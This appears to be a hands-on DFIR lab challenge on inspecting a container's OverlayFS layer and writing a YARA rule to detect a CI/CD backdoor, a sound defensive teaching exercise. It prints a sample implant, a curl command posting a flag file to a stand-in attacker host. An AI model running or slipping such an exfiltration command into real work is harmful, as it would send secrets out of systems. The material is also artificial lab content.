# Challenge 3: DFIR Triage & YARA Threat Hunting

## 📖 Background & Forensic Concepts

During a security incident involving containerized workloads, the Digital Forensics and Incident Response (DFIR) team must analyze the compromised container's filesystem and create detection signatures for threat hunting.

### Understanding OverlayFS in Container Forensics

Docker uses the **OverlayFS** union mount filesystem to manage container layers:
- **`lowerdir`**: Read-only layers representing the immutable base image.
- **`upperdir`**: The writable **Copy-on-Write (CoW)** layer created when the container starts. Any files created, modified, or deleted by attackers or processes inside the container live exclusively in this directory on the host!
- **`merged`**: The unified mountpoint presented to the running container processes.

As a forensic analyst, you can inspect a container's `UpperDir` directly on the host host filesystem without entering the container or relying on potentially backdoored utilities.

### Threat Hunting with YARA

**YARA** is the de facto standard tool for pattern matching and malware identification. In DevSecOps and DFIR operations, YARA rules are used in automated CI/CD artifact scanning and runtime endpoint detection agents to detect malicious payloads, web shells, and C2 exfiltration scripts.

A standard YARA rule consists of four primary blocks:
```yara
rule Rule_Name {
    meta:
        description = "Brief summary of detection logic"
        author      = "Analyst Name"
    strings:
        $string_identifier = "target sequence"
    condition:
        $string_identifier
}
```

---

## 🛠️ Step-by-Step Instructions

### 1. (Optional) Inspect the Container's OverlayFS Layer

From the host terminal, inspect the storage driver metadata of `cicd_runner_pipeline`:

```bash
docker inspect cicd_runner_pipeline | jq '.[0].GraphDriver.Data'
```

Notice the `UpperDir` path. This path on your host filesystem contains every modification written to the container since it booted, including the malicious implant placed at `/var/log/pipeline_audit/backdoor_implant.sh`.

### 2. Inspect the Forensic Evidence

For forensic triage, the security operations center (SOC) has mirrored the suspicious artifact to `/evidence/backdoor_implant.sh`. 

Navigate to the evidence directory and review the file:

```bash
cd /evidence
cat backdoor_implant.sh
```

You will see the adversary's exfiltration logic:

```bash
#!/bin/sh
# Malicious Exfiltration Hook
curl -X POST -d @/root/host_flag.txt http://evil-c2.attacker.internal/exfil
```

Identify the core **Indicators of Compromise (IoCs)**:
1. Malicious comment string: `# Malicious Exfiltration Hook`
2. Command and Control (C2) endpoint: `http://evil-c2.attacker.internal`

### 3. Create the YARA Detection Rule

Create a new YARA rule file at `/evidence/detect_implant.yar`:

```bash
nano /evidence/detect_implant.yar
```

Or write the rule directly from the command line using `cat`:

```bash
cat << "EOF" > /evidence/detect_implant.yar
rule Malicious_CI_CD_Exfiltration_Hook {
    meta:
        description = "Detects malicious pipeline exfiltration implant targeting host credentials"
        author      = "CPIFP Alan Turing DFIR Team"
        date        = "2026-10-02"
        severity    = "Critical"
        mitre_technique = "T1059.004, T1552.003"
    strings:
        $c2_domain = "http://evil-c2.attacker.internal" ascii
        $hook_comment = "# Malicious Exfiltration Hook" ascii
    condition:
        $c2_domain and $hook_comment
}
EOF
```

Verify that `/evidence/detect_implant.yar` was created correctly:

```bash
cat /evidence/detect_implant.yar
```

### 4. Test and Execute the YARA Rule

Run YARA against the target evidence sample:

```bash
yara /evidence/detect_implant.yar /evidence/backdoor_implant.sh
```

If the rule matches, YARA will print the rule identifier followed by the file path:
```text
Malicious_CI_CD_Exfiltration_Hook /evidence/backdoor_implant.sh
```

To see the exact byte offset and matching strings, use the `-s` flag:

```bash
yara -s /evidence/detect_implant.yar /evidence/backdoor_implant.sh
```

You should see each string identifier (`$c2_domain`, `$hook_comment`) matched with its offset in the target script.

---

## 🔍 DevSecOps Key Takeaway

> **How does this fit into DevSecOps?**
> In a production CI/CD pipeline, YARA rules are integrated into:
> - **Pre-Commit / Pre-Merge Scanners**: Scanning repositories and submodules for known attack patterns before code reaches production.
> - **Artifact Repository Scans**: Scanning container images in Harbor, AWS ECR, or Google Artifact Registry before deployment.
> - **Runtime EDR / eBPF Sensors**: Tools such as **Tetragon**, **Falco**, and **Tracee** match process arguments and file writes against threat signatures in real time.

---

## ✅ Verification

Click the **Check** button below or run the verification script directly from your terminal:

```bash
/step3/verify.sh
```
